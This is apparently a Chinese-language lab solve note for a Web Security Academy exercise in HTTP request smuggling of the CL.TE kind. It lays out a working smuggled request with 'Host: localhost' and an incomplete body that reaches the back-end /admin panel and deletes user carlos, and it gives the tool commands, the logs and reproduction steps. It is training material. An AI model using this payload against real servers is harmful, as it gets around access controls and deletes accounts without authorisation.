---
title: "lab-bypass-front-end-controls-cl-te"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-bypass-front-end-controls-cl-te

> evidences: [[request-smuggling-family]]

- 题面:Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
  (/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
- 实例:https://0a3e0048046833688304248f001b00ed.web-security-academy.net
- 判定目标:走私请求访问后端 `/admin` 并删 carlos;状态:**solved**(solved_check true,第 2 次读)

## 关键步

1. 直连 `GET /admin` → 前端 `403 {"error"…}` 体 `"Path /admin is blocked"`(JSON);
   走私过去 → 后端 `401` 页头 **"Admin interface only available to local users"**。
   → 后端的 admin 面用 **`Host` 头判"本地"**:走私请求必须带 `Host: localhost`。
2. **走私请求要"未完成"(Critical)**:把完整头 + 空行 + 半个 body 放进走私前缀,body 用
   `Content-Length: 15` 而只给 `x=1`(3 字节),让后端**等**下一请求的字节补全。
   - 若走私请求**完整**(自带结尾空行)→ 它的响应立刻生成,被前端丢弃,**下一个请求拿不到**。
   - 未完成式 → 响应在下一请求到达时才生成 → 前端把它当成下一请求的响应还给我们。
3. 读面板:`--cl-te 'GET /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1'`,
   随后普通 `GET /` → 回 **200 admin 面板**(`Content-Length: 3315`、`Cache-Control: no-cache`),
   内含 `<a href="/admin/delete?username=carlos">Delete</a>`。
4. 删除:同上把路径换成 `GET /admin/delete?username=carlos HTTP/1.1`,随后普通请求 →
   **302 `Location: /admin`** → carlos 已删。

## 证据摘录

```
lab_http get "<lab>/admin" -> 403 "Path /admin is blocked"
# 走私(前置)-> 完成(后置)
conn_reuse "<lab>/" --cl-te 'GET /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1' --read-ms 2500 --quiet
 -> 200 (POST / 的回包)                      # 后端此刻 hold,等 12 字节
conn_reuse "<lab>/" --send-str 'GET / HTTP/1.1\r\nHost: <lab>\r\n\r\n' --read-ms 3000
 -> HTTP/1.1 200 OK  Content-Length: 3315  Cache-Control: no-cache   # admin 面板(借下一请求交付)

conn_reuse "<lab>/" --cl-te 'GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1' --read-ms 2500 --quiet
conn_reuse "<lab>/" --send-str 'GET / HTTP/1.1\r\nHost: <lab>\r\n\r\n' --read-ms 3000
 -> HTTP/1.1 302 Found  Location: /admin
solved_check (第 1 次) -> status 400(命中补全遗留的畸形残余)
solved_check (第 2 次) -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch D87789ADEC7383329012F5A094910FC21A7BF4958ACF05F883AC78DDD12C6A37 \
  --widget-source /web-security/request-smuggling/exploiting --jar JAR
conn_reuse "<lab>/" --cl-te 'GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1' --quiet
conn_reuse "<lab>/" --send-str 'GET / HTTP/1.1\r\nHost: <lab>\r\n\r\n'
solved_check "<lab>/" --jar JAR      # 可能首次 400,再跑一次
```

要点:**`Host: localhost`** 过"local users"、**CL 留空**(15 vs 3 字节)让响应借下一请求交付、
**连续两步之间不插多余请求**(残余畸形字节会 400 掉下一个请求)。
